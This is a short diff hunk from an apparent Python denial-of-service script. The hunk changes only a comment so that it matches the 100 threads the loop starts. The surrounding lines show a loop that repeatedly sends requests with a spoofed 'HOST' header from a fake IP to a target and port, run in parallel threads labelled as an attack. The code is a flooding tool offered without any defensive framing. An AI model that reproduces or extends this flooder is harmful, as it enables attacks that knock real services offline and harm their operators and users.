@@ -34,7 +34,7 @@ while True:
             s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
             s.close()
 
-    # Run 500 threads of the defined attack
+    # Run 100 threads of the defined attack
     for i in range(100):
         thread = threading.Thread(target=single_attack)
         thread.start()
